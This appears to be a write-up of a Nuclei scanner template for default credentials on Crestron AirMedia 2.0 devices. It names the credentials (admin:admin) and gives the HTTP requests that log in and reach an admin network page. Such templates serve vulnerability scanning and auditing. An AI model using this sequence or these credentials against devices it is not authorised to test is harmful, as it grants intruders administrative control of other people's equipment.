# Nuclei Template: Crestron Airmedia 2.0 - Default Login
**Template ID:** crestron-airmedia-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`crestron-airmedia-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Crestron AirMedia 2.0 devices contain default credentials (admin:admin) that allow unauthorized administrative access to device configuration and control.

## Steps to reproduce / Exploit Payload
```http
GET /userlogin.html HTTP/1.1
Host: {{Hostname}}

POST /userlogin.html HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

login={{username}}&passwd={{password}}

GET /webView/Network HTTP/1.1
Host: {{Hostname}}
```

